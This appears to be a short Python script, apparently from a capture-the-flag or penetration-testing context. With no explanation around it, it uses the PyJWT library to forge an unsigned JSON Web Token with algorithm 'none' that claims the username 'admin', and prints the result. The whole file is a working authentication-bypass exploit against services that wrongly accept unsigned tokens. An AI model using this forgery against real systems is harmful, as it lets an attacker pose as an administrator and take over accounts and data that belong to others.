import jwt
encoded = jwt.encode({'username': 'admin'}, '', algorithm='none')

print(encoded)
